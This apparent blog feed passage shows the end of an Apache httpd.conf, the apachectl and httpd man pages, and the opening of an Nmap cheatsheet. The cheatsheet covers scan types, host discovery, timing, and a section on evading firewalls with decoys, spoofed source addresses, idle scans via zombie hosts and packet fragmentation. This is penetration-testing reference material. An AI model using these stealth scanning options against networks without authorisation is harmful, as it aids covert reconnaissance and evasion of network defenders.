</span><span class='line'># ErrorLog: The location of the error log file.
</span><span class='line'># If you do not specify an ErrorLog directive within a &lt;VirtualHost&gt;
</span><span class='line'># container, error messages relating to that virtual host will be
</span><span class='line'># logged here.  If you *do* define an error logfile for a &lt;VirtualHost&gt;
</span><span class='line'># container, that host's errors will be logged there and not here.
</span><span class='line'>#
</span><span class='line'>ErrorLog "logs/error_log"
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># LogLevel: Control the number of messages logged to the error_log.
</span><span class='line'># Possible values include: debug, info, notice, warn, error, crit,
</span><span class='line'># alert, emerg.
</span><span class='line'>#
</span><span class='line'>LogLevel warn
</span><span class='line'>
</span><span class='line'>&lt;IfModule log_config_module&gt;
</span><span class='line'>    #
</span><span class='line'>    # The following directives define some format nicknames for use with
</span><span class='line'>    # a CustomLog directive (see below).
</span><span class='line'>    #
</span><span class='line'>    LogFormat "%h %l %u %t \"%r\" %&gt;s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined
</span><span class='line'>    LogFormat "%h %l %u %t \"%r\" %&gt;s %b" common
</span><span class='line'>
</span><span class='line'>    &lt;IfModule logio_module&gt;
</span><span class='line'>      # You need to enable mod_logio.c to use %I and %O
</span><span class='line'>      LogFormat "%h %l %u %t \"%r\" %&gt;s %b \"%{Referer}i\" \"%{User-Agent}i\" %I %O" combinedio
</span><span class='line'>    &lt;/IfModule&gt;
</span><span class='line'>
</span><span class='line'>    #
</span><span class='line'>    # The location and format of the access logfile (Common Logfile Format).
</span><span class='line'>    # If you do not define any access logfiles within a &lt;VirtualHost&gt;
</span><span class='line'>    # container, they will be logged here.  Contrariwise, if you *do*
</span><span class='line'>    # define per-&lt;VirtualHost&gt; access logfiles, transactions will be
</span><span class='line'>    # logged therein and *not* in this file.
</span><span class='line'>    #
</span><span class='line'>    #CustomLog "logs/access_log" common
</span><span class='line'>
</span><span class='line'>    #
</span><span class='line'>    # If you prefer a logfile with access, agent, and referer information
</span><span class='line'>    # (Combined Logfile Format) you can use the following directive.
</span><span class='line'>    #
</span><span class='line'>    CustomLog "logs/access_log" combined
</span><span class='line'>&lt;/IfModule&gt;
</span><span class='line'>
</span><span class='line'>&lt;IfModule alias_module&gt;
</span><span class='line'>    #
</span><span class='line'>    # Redirect: Allows you to tell clients about documents that used to 
</span><span class='line'>    # exist in your server's namespace, but do not anymore. The client 
</span><span class='line'>    # will make a new request for the document at its new location.
</span><span class='line'>    # Example:
</span><span class='line'>    # Redirect permanent /foo http://www.example.com/bar
</span><span class='line'>
</span><span class='line'>    #
</span><span class='line'>    # Alias: Maps web paths into filesystem paths and is used to
</span><span class='line'>    # access content that does not live under the DocumentRoot.
</span><span class='line'>    # Example:
</span><span class='line'>    # Alias /webpath /full/filesystem/path
</span><span class='line'>    #
</span><span class='line'>    # If you include a trailing / on /webpath then the server will
</span><span class='line'>    # require it to be present in the URL.  You will also likely
</span><span class='line'>    # need to provide a &lt;Directory&gt; section to allow access to
</span><span class='line'>    # the filesystem path.
</span><span class='line'>
</span><span class='line'>    #
</span><span class='line'>    # ScriptAlias: This controls which directories contain server scripts. 
</span><span class='line'>    # ScriptAliases are essentially the same as Aliases, except that
</span><span class='line'>    # documents in the target directory are treated as applications and
</span><span class='line'>    # run by the server when requested rather than as documents sent to the
</span><span class='line'>    # client.  The same rules about trailing "/" apply to ScriptAlias
</span><span class='line'>    # directives as to Alias.
</span><span class='line'>    #
</span><span class='line'>    ScriptAlias /cgi-bin/ "/var/www/cgi-bin/"
</span><span class='line'>
</span><span class='line'>&lt;/IfModule&gt;
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># "/var/www/cgi-bin" should be changed to whatever your ScriptAliased
</span><span class='line'># CGI directory exists, if you have that configured.
</span><span class='line'>#
</span><span class='line'>&lt;Directory "/var/www/cgi-bin"&gt;
</span><span class='line'>    AllowOverride None
</span><span class='line'>    Options None
</span><span class='line'>    Require all granted
</span><span class='line'>&lt;/Directory&gt;
</span><span class='line'>
</span><span class='line'>&lt;IfModule mime_module&gt;
</span><span class='line'>    #
</span><span class='line'>    # TypesConfig points to the file containing the list of mappings from
</span><span class='line'>    # filename extension to MIME-type.
</span><span class='line'>    #
</span><span class='line'>    TypesConfig /etc/mime.types
</span><span class='line'>
</span><span class='line'>    #
</span><span class='line'>    # AddType allows you to add to or override the MIME configuration
</span><span class='line'>    # file specified in TypesConfig for specific file types.
</span><span class='line'>    #
</span><span class='line'>    #AddType application/x-gzip .tgz
</span><span class='line'>    #
</span><span class='line'>    # AddEncoding allows you to have certain browsers uncompress
</span><span class='line'>    # information on the fly. Note: Not all browsers support this.
</span><span class='line'>    #
</span><span class='line'>    #AddEncoding x-compress .Z
</span><span class='line'>    #AddEncoding x-gzip .gz .tgz
</span><span class='line'>    #
</span><span class='line'>    # If the AddEncoding directives above are commented-out, then you
</span><span class='line'>    # probably should define those extensions to indicate media types:
</span><span class='line'>    #
</span><span class='line'>    AddType application/x-compress .Z
</span><span class='line'>    AddType application/x-gzip .gz .tgz
</span><span class='line'>
</span><span class='line'>    #
</span><span class='line'>    # AddHandler allows you to map certain file extensions to "handlers":
</span><span class='line'>    # actions unrelated to filetype. These can be either built into the server
</span><span class='line'>    # or added with the Action directive (see below)
</span><span class='line'>    #
</span><span class='line'>    # To use CGI scripts outside of ScriptAliased directories:
</span><span class='line'>    # (You will also need to add "ExecCGI" to the "Options" directive.)
</span><span class='line'>    #
</span><span class='line'>    #AddHandler cgi-script .cgi
</span><span class='line'>
</span><span class='line'>    # For type maps (negotiated resources):
</span><span class='line'>    #AddHandler type-map var
</span><span class='line'>
</span><span class='line'>    #
</span><span class='line'>    # Filters allow you to process content before it is sent to the client.
</span><span class='line'>    #
</span><span class='line'>    # To parse .shtml files for server-side includes (SSI):
</span><span class='line'>    # (You will also need to add "Includes" to the "Options" directive.)
</span><span class='line'>    #
</span><span class='line'>    AddType text/html .shtml
</span><span class='line'>    AddOutputFilter INCLUDES .shtml
</span><span class='line'>&lt;/IfModule&gt;
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Specify a default charset for all content served; this enables
</span><span class='line'># interpretation of all content as UTF-8 by default.  To use the 
</span><span class='line'># default browser choice (ISO-8859-1), or to allow the META tags
</span><span class='line'># in HTML content to override this choice, comment out this
</span><span class='line'># directive:
</span><span class='line'>#
</span><span class='line'>AddDefaultCharset UTF-8
</span><span class='line'>
</span><span class='line'>&lt;IfModule mime_magic_module&gt;
</span><span class='line'>    #
</span><span class='line'>    # The mod_mime_magic module allows the server to use various hints from the
</span><span class='line'>    # contents of the file itself to determine its type.  The MIMEMagicFile
</span><span class='line'>    # directive tells the module where the hint definitions are located.
</span><span class='line'>    #
</span><span class='line'>    MIMEMagicFile conf/magic
</span><span class='line'>&lt;/IfModule&gt;
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Customizable error responses come in three flavors:
</span><span class='line'># 1) plain text 2) local redirects 3) external redirects
</span><span class='line'>#
</span><span class='line'># Some examples:
</span><span class='line'>#ErrorDocument 500 "The server made a boo boo."
</span><span class='line'>#ErrorDocument 404 /missing.html
</span><span class='line'>#ErrorDocument 404 "/cgi-bin/missing_handler.pl"
</span><span class='line'>#ErrorDocument 402 http://www.example.com/subscription_info.html
</span><span class='line'>#
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># EnableMMAP and EnableSendfile: On systems that support it, 
</span><span class='line'># memory-mapping or the sendfile syscall may be used to deliver
</span><span class='line'># files.  This usually improves server performance, but must
</span><span class='line'># be turned off when serving from networked-mounted 
</span><span class='line'># filesystems or if support for these functions is otherwise
</span><span class='line'># broken on your system.
</span><span class='line'># Defaults if commented: EnableMMAP On, EnableSendfile Off
</span><span class='line'>#
</span><span class='line'>#EnableMMAP off
</span><span class='line'>EnableSendfile on
</span><span class='line'>
</span><span class='line'># Supplemental configuration
</span><span class='line'>#
</span><span class='line'># Load config files in the "/etc/httpd/conf.d" directory, if any.
</span><span class='line'>IncludeOptional conf.d/*.conf</span></code></pre></td></tr></table></div></figure>


<p><strong>apachectl utility</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>APACHECTL(8)              apachectl                APACHECTL(8)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>NAME
</span><span class='line'>       apachectl - Apache HTTP Server Control Interface
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>SYNOPSIS
</span><span class='line'>       When  acting  in    pass-through  mode,  apachectl can take all the arguments
</span><span class='line'>       available for the httpd binary.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       apachectl [ httpd-argument ]
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       When acting in SysV init mode, apachectl takes simple,  one-word    commands,
</span><span class='line'>       defined below.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       apachectl command
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>SUMMARY
</span><span class='line'>       apachectl  is  a front end to the Apache HyperText Transfer Protocol (HTTP)
</span><span class='line'>       server. It is designed to help the administrator control the functioning of
</span><span class='line'>       the Apache httpd daemon.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       The  apachectl script can operate in two modes. First, it can act as a sim‐
</span><span class='line'>       ple front-end to the httpd command that simply sets any necessary  environ‐
</span><span class='line'>       ment  variables    and  then  invokes httpd, passing through any command line
</span><span class='line'>       arguments. Second, apachectl can act as a SysV init script,  taking  simple
</span><span class='line'>       one-word arguments like start, restart, and stop, and translating them into
</span><span class='line'>       appropriate signals to httpd.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       If your Apache installation uses non-standard paths, you will need to  edit
</span><span class='line'>       the  apachectl script to set the appropriate paths to the httpd binary. You
</span><span class='line'>       can also specify any necessary httpd command line arguments. See    the  com‐
</span><span class='line'>       ments in the script for details.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       The  apachectl script returns a 0 exit value on success, and &gt;0 if an error
</span><span class='line'>       occurs. For more details, view the comments in the script.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>OPTIONS
</span><span class='line'>       Only the SysV init-style options are  defined  here.  Other  arguments  are
</span><span class='line'>       defined on the httpd manual page.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       start  Start  the Apache httpd daemon. Gives an error if it is already run‐
</span><span class='line'>        ning. This is equivalent to apachectl -k start.
</span><span class='line'>
</span><span class='line'>       stop   Stops the Apache httpd daemon. This is equivalent    to  apachectl  -k
</span><span class='line'>        stop.
</span><span class='line'>
</span><span class='line'>       restart
</span><span class='line'>        Restarts  the  Apache httpd daemon. If the daemon is not running, it
</span><span class='line'>        is started. This  command  automatically  checks  the  configuration
</span><span class='line'>        files  as  in  configtest before initiating the restart to make sure
</span><span class='line'>        the daemon doesn't die. This is equivalent to apachectl -k restart.
</span><span class='line'>
</span><span class='line'>       fullstatus
</span><span class='line'>        Displays a full status report from mod_status. For this to work, you
</span><span class='line'>        need  to  have  mod_status  enabled  on your server and a text-based
</span><span class='line'>        browser such as lynx available on  your  system.  The  URL  used  to
</span><span class='line'>        access  the  status report can be set by editing the STATUSURL vari‐
</span><span class='line'>        able in the script.
</span><span class='line'>
</span><span class='line'>       status Displays a brief status report using systemd.
</span><span class='line'>
</span><span class='line'>       graceful
</span><span class='line'>        Gracefully restarts the Apache httpd daemon. If the  daemon  is  not
</span><span class='line'>        running,  it  is  not started. This differs from a normal restart in
</span><span class='line'>        that currently open connections are not aborted. A  side  effect  is
</span><span class='line'>        that  old  log files will not be closed immediately. This means that
</span><span class='line'>        if used in a log rotation script, a substantial delay may be  neces‐
</span><span class='line'>        sary  to  ensure that the old log files are closed before processing
</span><span class='line'>        them. This command automatically checks the configuration  files  as
</span><span class='line'>        in  configtest  before  initiating  the  restart to make sure Apache
</span><span class='line'>        doesn't die. This is equivalent to apachectl -k graceful.
</span><span class='line'>
</span><span class='line'>       graceful-stop
</span><span class='line'>        Gracefully stops the Apache httpd daemon. This differs from a normal
</span><span class='line'>        stop  in  that  currently  open  connections are not aborted. A side
</span><span class='line'>        effect is that old log files will not be closed immediately. This is
</span><span class='line'>        equivalent to apachectl -k graceful-stop.
</span><span class='line'>
</span><span class='line'>       configtest
</span><span class='line'>        Run  a  configuration  file syntax test. It parses the configuration
</span><span class='line'>        files and either reports Syntax Ok or detailed information about the
</span><span class='line'>        particular syntax error. This is equivalent to apachectl -t.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       The  following  option  was  available  in  earlier  versions  but has been
</span><span class='line'>       removed.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       startssl
</span><span class='line'>        To start httpd with SSL support, you should edit your  configuration
</span><span class='line'>        file  to  include  the  relevant  directives and then use the normal
</span><span class='line'>        apachectl start.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Apache HTTP Server            2005-08-26                APACHECTL(8)</span></code></pre></td></tr></table></div></figure>


<p><strong>httpd reference</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HTTPD(8)                httpd                  HTTPD(8)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>NAME
</span><span class='line'>       httpd - Apache Hypertext Transfer Protocol Server
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>SYNOPSIS
</span><span class='line'>       httpd  [    -d serverroot ] [ -f config ] [ -C directive ] [ -c directive ] [
</span><span class='line'>       -D parameter ] [    -e  level  ]  [  -E  file  ]  [  -k  start|restart|grace‐
</span><span class='line'>       ful|stop|graceful-stop  ] [ -R directory ] [ -h ] [ -l ] [ -L ] [ -S ] [ -t
</span><span class='line'>       ] [ -v ] [ -V ] [ -X ] [ -M ] [ -T ]
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       On Windows systems, the following additional arguments are available:
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       httpd [ -k install|config|uninstall ] [ -n name ] [ -w ]
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>SUMMARY
</span><span class='line'>       httpd is the Apache HyperText Transfer Protocol (HTTP) server  program.    It
</span><span class='line'>       is  designed  to be run as a standalone daemon process. When used like this
</span><span class='line'>       it will create a pool of child processes or threads to handle requests.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       In general, httpd should not be invoked    directly,  but  rather  should  be
</span><span class='line'>       invoked    via apachectl on Unix-based systems or as a service on Windows NT,
</span><span class='line'>       2000 and XP and as a console application on Windows 9x and ME.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>OPTIONS
</span><span class='line'>       -d serverroot
</span><span class='line'>        Set the initial value for the ServerRoot  directive  to  serverroot.
</span><span class='line'>        This can be overridden by the ServerRoot directive in the configura‐
</span><span class='line'>        tion file. The default is /etc/httpd.
</span><span class='line'>
</span><span class='line'>       -f config
</span><span class='line'>        Uses the directives in the file config on startup.  If  config  does
</span><span class='line'>        not  begin  with  a /, then it is taken to be a path relative to the
</span><span class='line'>        ServerRoot. The default is conf/httpd.conf.
</span><span class='line'>
</span><span class='line'>       -k start|restart|graceful|stop|graceful-stop
</span><span class='line'>        Signals httpd to start, restart, or stop. See Stopping Apache  httpd
</span><span class='line'>        for more information.
</span><span class='line'>
</span><span class='line'>       -C directive
</span><span class='line'>        Process the configuration directive before reading config files.
</span><span class='line'>
</span><span class='line'>       -c directive
</span><span class='line'>        Process the configuration directive after reading config files.
</span><span class='line'>
</span><span class='line'>       -D parameter
</span><span class='line'>        Sets  a  configuration  parameter  which can be used with &lt;IfDefine&gt;
</span><span class='line'>        sections in the configuration files to conditionally skip or process
</span><span class='line'>        commands at server startup and restart. Also can be used to set cer‐
</span><span class='line'>        tain less-common startup parameters including  -DNO_DETACH  (prevent
</span><span class='line'>        the  parent  from forking) and -DFOREGROUND (prevent the parent from
</span><span class='line'>        calling setsid() et al).
</span><span class='line'>
</span><span class='line'>       -e level
</span><span class='line'>        Sets the LogLevel to level during server startup. This is useful for
</span><span class='line'>        temporarily  increasing  the verbosity of the error messages to find
</span><span class='line'>        problems during startup.
</span><span class='line'>
</span><span class='line'>       -E file
</span><span class='line'>        Send error messages during server startup to file.
</span><span class='line'>
</span><span class='line'>       -h     Output a short summary of available command line options.
</span><span class='line'>
</span><span class='line'>       -l     Output a list of modules compiled into the  server.  This    will  not
</span><span class='line'>        list dynamically loaded modules included using the LoadModule direc‐
</span><span class='line'>        tive.
</span><span class='line'>
</span><span class='line'>       -L     Output a list of directives provided  by    static  modules,  together
</span><span class='line'>        with  expected  arguments  and  places where the directive is valid.
</span><span class='line'>        Directives provided by shared modules are not listed.
</span><span class='line'>
</span><span class='line'>       -M     Dump a list of loaded Static and Shared Modules.
</span><span class='line'>
</span><span class='line'>       -S     Show the settings as parsed from the  config  file  (currently  only
</span><span class='line'>        shows the virtualhost settings).
</span><span class='line'>
</span><span class='line'>       -T (Available in 2.3.8 and later)
</span><span class='line'>        Skip document root check at startup/restart.
</span><span class='line'>
</span><span class='line'>       -t     Run  syntax  tests for configuration files only. The program immedi‐
</span><span class='line'>        ately exits after these syntax parsing tests with  either  a  return
</span><span class='line'>        code  of 0 (Syntax OK) or return code not equal to 0 (Syntax Error).
</span><span class='line'>        If -D DUMP_VHOSTS is also set, details of the virtual host  configu‐
</span><span class='line'>        ration  will be printed. If -D DUMP_MODULES  is set, all loaded mod‐
</span><span class='line'>        ules will be printed.
</span><span class='line'>
</span><span class='line'>       -v     Print the version of httpd, and then exit.
</span><span class='line'>
</span><span class='line'>       -V     Print the version and build parameters of httpd, and then exit.
</span><span class='line'>
</span><span class='line'>       -X     Run httpd in debug mode. Only one worker will  be    started  and  the
</span><span class='line'>        server will not detach from the console.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       The following arguments are available only on the Windows platform:
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       -k install|config|uninstall
</span><span class='line'>        Install Apache httpd as a Windows NT service; change startup options
</span><span class='line'>        for the Apache httpd service; and uninstall the  Apache  httpd  ser‐
</span><span class='line'>        vice.
</span><span class='line'>
</span><span class='line'>       -n name
</span><span class='line'>        The name of the Apache httpd service to signal.
</span><span class='line'>
</span><span class='line'>       -w     Keep  the console window open on error so that the error message can
</span><span class='line'>        be read.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Apache HTTP Server            2012-02-10                HTTPD(8)</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Nmap cheatsheet]]></title>
    <link href="http://chousensha.github.io/blog/2016/07/31/nmap-cheatsheet/"/>
    <updated>2016-07-31T06:40:43-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/07/31/nmap-cheatsheet</id>
    <content type="html"><![CDATA[<p>Recently, I&rsquo;ve been reading Fyodor&rsquo;s <a href="https://www.amazon.com/Nmap-Network-Scanning-Official-Discovery/dp/0979958717">Nmap Network Scanning</a> book and decided to create an Nmap cheatsheet while at it.</p>

<p>Half of the book, including updated content, is also available for free on <a href="https://nmap.org/book/toc.html">https://nmap.org/book/toc.html</a></p>

<p>Fyodor was also nice enough to set up a machine that you can test your scans against (within reasonable limits), at <a href="http://scanme.nmap.org/">http://scanme.nmap.org/</a></p>

<p>All right, let&rsquo;s get scanning!</p>

<!-- more -->


<h1>Commands cheatsheet</h1>

<h2>Scan types</h2>

<p><strong>-sS</strong>: TCP SYN scan &ndash; the default scan, most popular due to its speed and stealth, as it doesn&rsquo;t complete a TCP connection</p>

<p><strong>-sT</strong>: TCP Connect scan, it uses the connect() system call, used by unprivileged users who can&rsquo;t send raw packets or when scanning IPv6 targets</p>

<p><strong>-sV</strong>: Version detection, omit for performance increase and/or stealth</p>

<p><strong>-sA</strong>: TCP ACK scan, can&rsquo;t tell if the ports are open or closed, but it can determine whether firewall rules are stateful or stateless</p>

<p><strong>-sW</strong>: TCP Window scan, same as ACK, but it can determine open and closed ports on certain systems</p>

<p><strong>-sM</strong>: Maimon scan, yet another special scan type for bypassing firewalls</p>

<p><strong>-sU</strong>: UDP scan. You can improve it by adding a version scan alongside it (but it will be slower)</p>

<p><strong>-sF</strong>: FIN scan, sets the FIN bit, useful in bypassing some firewalls and determining the target&rsquo;s OS between Windows and Unix types, as it doesn&rsquo;t work against Windows</p>

<p><strong>-sX</strong>: Xmas scan, another option for firewall evasion, sets the FIN, PSH, and URG flags, creating the impression of a lit Christmas tree</p>

<p><strong>-sN</strong>: Null scan, doesn&rsquo;t set any flags, an additional option to evade pesky firewalls</p>

<p><strong>-sO</strong>: IP protocol scan, check which IP protocols are supported on the target</p>

<p><strong>-b <FTP relay host></strong>: FTP bounce scan, also available to unprivileged users</p>

<p><strong>-A</strong>: Enable OS detection, version detection, script scanning, and traceroute</p>

<h3>Host discovery</h3>

<p><strong>List scan &ndash; sL</strong> &ndash; enumerates the addresses in the specified range and does reverse DNS lookup on them. Good for getting a feel about the targets by checking their DNS names, and maintaining a low profile on the network (because no ping requests are being sent yet, so it&rsquo;s stealthier)</p>

<p><strong>-p-</strong>: Shortcut for <em>-p1-65535</em></p>

<p><strong>-Pn</strong>: Treat all hosts as online &mdash; skip host discovery (disable ping)</p>

<p><strong>&mdash;exclude &lt;host1[,host2][,host3],&hellip;></strong>: Exclude hosts/networks</p>

<p><strong>-n</strong>: Never do DNS resolution</p>

<p><strong>-sP</strong>: perform a ping sweep</p>

<p><strong>-PS/PA/PU</strong>: TCP SYN ping/TCP ACK ping/UDP ping &ndash; various host discovery options for bypassing firewalls</p>

<h3>Performance</h3>

<p><strong>-T&lt;0-5></strong>: Set timing template (higher is faster). -T4 (aggressive) is recommended for most cases, as it improves performance and optimization for a fast and reliable network. For evasion purposes you can use T0 (paranoid) or T1 (sneaky), but speed will be very slow. To conserve bandwidth and resources you may use T2 (polite), at another significant expense of speed. T3 is the normal mode, and T5 is an insane level of speed (but you might sacrifice some accuracy in the process)</p>

<p><strong>-F</strong>: Fast scan, only scan most common 100 ports</p>

<h3>Evasion</h3>

<p><strong>-D &lt;decoy1,decoy2[,ME],&hellip;></strong>: Cloak a scan with decoys</p>

<p><strong>&mdash;scanflags <flags></strong>: Customize TCP scan flags. You can couple it with specifying a TCP scan type to give Nmap a base of interpreting the results</p>

<p><strong>-S &lt;IP_Address></strong>: Spoof source address</p>

<p><strong>-sI <zombie host[:probeport]></strong>: Idle scan, a complex scan that is stealthy but slow. It uses zombies to perform the scan, without sending packets directly from your IP. Use in tandem with the -PN option to disable ping and not disclose your real address. Avoid -sV, as version detection would also make your IP visible to the target</p>

<p><strong>-f; &mdash;mtu <val></strong>: fragment packets (optionally w/given MTU), can aid in bypassing firewalls that don&rsquo;t handle fragmentation well</p>

<p><strong>-g/&mdash;source-port <portnum></strong>: Spoof source port, bypass security measures that rely only on checking the source port</p>

<p><strong>&mdash;spoof-mac <mac address/prefix/vendor name></strong>: Spoof your MAC address</p>

